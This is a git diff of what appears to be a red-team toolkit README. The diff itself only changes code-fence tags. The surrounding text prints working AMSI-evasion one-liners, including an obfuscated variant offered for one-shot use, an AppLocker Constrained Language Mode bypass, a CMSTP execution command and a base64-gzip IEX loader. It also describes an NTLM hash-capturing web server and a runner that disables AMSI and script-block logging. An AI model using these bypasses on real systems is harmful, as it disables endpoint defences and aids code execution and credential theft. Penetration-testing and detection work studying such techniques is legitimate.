@@ -7,7 +7,7 @@
 - **`Bypass-ConstrainedLanguageMode`** - Tries to bypass AppLocker Constrained Language Mode via custom COM object (as documented by @xpn in: https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/ )
 The way it does so is by registering a custom COM object (`InProcServer32` DLL) that will act as a native *.NET CLR4* host. This host is then going to load up a managed assembly within it's current AppDomain. That assembly finally will switch `SessionData.LanguageMode` variable determining whether Constrained Language Mode shall be used within current Runspace. More details in the tool directory itself.
 
-```
+```powershell
 PS >  $ExecutionContext.SessionState.LanguageMode
 ConstrainedLanguage 
 PS > .\Bypass-CLM.ps1
@@ -48,7 +48,7 @@ FullLanguage
 
 - **`cmstp-template.inf`** - INF file being a smallest possible template for **CMSTP** code execution technique, as described by [LOLBAS project](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/). Sample usage:
 
-```
+```powershell
 cmstp.exe /ni /s cmstp.inf
 ```
 
@@ -63,7 +63,7 @@ cmstp.exe /ni /s cmstp.inf
 
     Example:
 
-```
+```powershell
 $s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 ```
@@ -78,7 +78,7 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Com
 
 Using a hash-lookup approach when determining prohibited symbol names, we are able to avoid relying on blacklisted values and having them hardcoded within the script. This implementation iterates over all of the assemblies, their exposed types, methods and fields in order to find those that are required but by their computed hash-value rather than direct name. Since hash-value computation algorithm was open-sources and is simple to manipulate, the attacker becomes able to customize hash-lookup scheme the way he likes.
 
-```
+```powershell
 PS > "amsiInitFailed"
 At line:1 char:1
 + "amsiInitFailed"
@@ -97,12 +97,12 @@ amsiInitFailed
 
    - OH, by the way - you can grab **my custom AMSI evasion oneliners** below - perfect for a one-shot use cases:
       * **Technique 1A**: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
-      ```
+      ```powershell
       [Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
       ```
 
       * **Technique 1B**: Same as 1A, but obfuscated variant. (256 bytes)
-      ```
+      ```powershell
       $h=[TyPE]('{5}{2}{4}{0}{3}{1}'-f'er','L','Un','viCes.maRShA','TIME.INTErOPS','r');Sv('W'+'e') ([tYpe]('{1}{0}'-f'EF','r'));(gET-vAriABLE h).vAlue::WriteByte((($wE.Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
       ```
 
@@ -125,7 +125,7 @@ amsiInitFailed
     - `Import-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
     - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.
 
-```
+```powershell
 PS E:\PowerSploit\Recon> Load-ReconData -DirName .\PowerView-12-18-2018-08-30-09
 Loaded $FileFinderSearchSYSVol results.
 Loaded $FileFinder results.
@@ -176,7 +176,7 @@ This script can embed following data within constructed CSharp Task:
 
     Example output **not minimized**:
     
-```
+```powershell
 C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py     Show-Msgbox.ps1
 
         :: Powershell via MSBuild inline-task XML payload generation script
@@ -233,7 +233,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py     Show-Msgbox
     
 **minimized**
     
-```
+```powershell
 C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py Show-Msgbox.ps1 -m                     
                                                                                                                   
         :: Powershell via MSBuild inline-task XML payload generation script                                       
@@ -251,13 +251,13 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py Show-Msgbox.ps1
 
 This scriptlet works with both older version of PowerView that got implemented `Get-NetOU` cmdlet, by passing its output via pipeline to `Get-NetOUTree`:
 
-```
+```powershell
 PS E:\PowerSploit\Recon> Get-NetOU | Get-NetOUTree
 ```
 
 or with new version of PowerView coming with it's `Get-DomainOU` cmdlet.
 
-```
+```powershell
 PS E:\PowerSploit\Recon> Get-DomainOU | Get-DomainOUTree
 + CONTOSO
    + SharedFolders
@@ -296,7 +296,7 @@ PS E:\PowerSploit\Recon> Get-DomainOU | Get-DomainOUTree
 
 - **`markOwnedNodesInNeo4j.py`** - This script takes an input file containing Node names to be marked in Neo4j database as owned = True. The strategy for working with neo4j and Bloodhound becomes fruitful during complex Active Directory Security Review assessments or Red Teams. Imagine you've kerberoasted a number of accounts, access set of workstations or even cracked userPassword hashes. Using this script you can quickly instruct Neo4j to mark that principals as owned, which will enrich your future use of BloodHound.
 
-```
+```bash
 $ ./markOwnedNodesInNeo4j.py kerberoasted.txt
 [.] Connected to neo4j instance.
 [.] Marking nodes (0..10) ...
@@ -342,7 +342,7 @@ $ ./markOwnedNodesInNeo4j.py kerberoasted.txt
 
 - [**`SharpWebServer`**](https://github.com/mgeeky/SharpWebServer) - Red Team oriented C# Simple HTTP Server with Net-NTLMv1/2 hashes capture functionality
 
-```
+```powershell
 C:\> SharpWebServer.exe port=8888 dir=C:\Windows\Temp verbose=true ntlm=true
 
     :: SharpWebServer ::
@@ -377,7 +377,7 @@ SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 11 (200)
   * The resulting binary may be considered bit too large, that's because `Costura.Fody` NuGet package is used which bundles `System.Management.Automation.dll` within resulting assembly
 
 
-```
+```powershell
 PS D:\> Stracciatella.exe -v -b -x 0x31 -c "ZkNYRVQceV5CRRETeEURRl5DWkIRXVhaVBFQEVJZUENcEBMRChEVdElUUkRFWF5fcl5fRVRJRR9iVEJCWF5fYkVQRVQffVBfVkRQVlR8XlVU" .\Test2.ps1
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
